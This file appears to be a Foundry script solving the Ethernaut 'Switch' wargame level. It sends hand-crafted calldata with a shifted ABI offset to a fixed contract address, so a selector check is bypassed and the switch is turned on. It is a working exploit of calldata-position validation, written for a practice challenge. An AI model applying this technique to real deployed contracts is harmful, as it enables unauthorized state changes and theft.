// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Switch} from "../src/29_Switch.sol";
import {Script, console} from "forge-std/Script.sol";

contract SwitchSolve is Script {
    Switch _switch = Switch(0xb2aBa0e156C905a9FAEc24805a009d99193E3E53);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes memory data = abi.encodeWithSignature(
            "flipSwitch(bytes)",
            0x60,
            0x00,
            0x20606e1500000000000000000000000000000000000000000000000000000000,
            0x04,
            0x76227e1200000000000000000000000000000000000000000000000000000000
        );
        console.logBytes(data);
        address(_switch).call(data);
        vm.stopBroadcast();
    }
}
